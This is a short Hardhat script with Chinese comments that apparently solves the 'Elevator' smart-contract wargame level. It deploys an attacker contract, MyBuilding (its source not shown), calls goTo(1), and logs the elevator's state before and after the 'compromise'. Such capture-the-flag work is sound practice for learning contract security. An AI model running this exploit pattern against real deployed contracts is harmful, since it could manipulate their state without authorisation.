import hre from "hardhat";
const { ethers } = hre;

// 替換成電梯合約的關卡實例地址
const elevator_address = "0xD32BAc87338a0db4a5230BA19fdD09d80C7ddA6c";

async function deploy() {
    const Contract = await ethers.getContractFactory("MyBuilding");
    const contract = await Contract.deploy(elevator_address);
    await contract.waitForDeployment();
      
    console.log("Contract deployed to: ", await contract.getAddress());
    return contract; // return the deployed contract
}

async function main() {
    const myBuilding = await deploy();

    const elevator = await ethers.getContractAt("Elevator", elevator_address);

    console.log("目前的 elevator top 值: ", await elevator.top());
    console.log("目前的 elevator floor 值: ", await elevator.floor());

    console.log("呼叫  myBuilding.goTo(1) ...",);
    const tx = await myBuilding.goTo(1);
    console.log("交易哈希:", tx.hash);
    // 等待交易確認
    const receipt = await tx.wait();

    console.log("交易已確認");
    console.log("交易收據:", receipt);
    

    console.log("攻陷後，目前的 elevator top 值: ", await elevator.top());
    console.log("攻陷後，目前的 elevator floor 值: ", await elevator.floor());
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });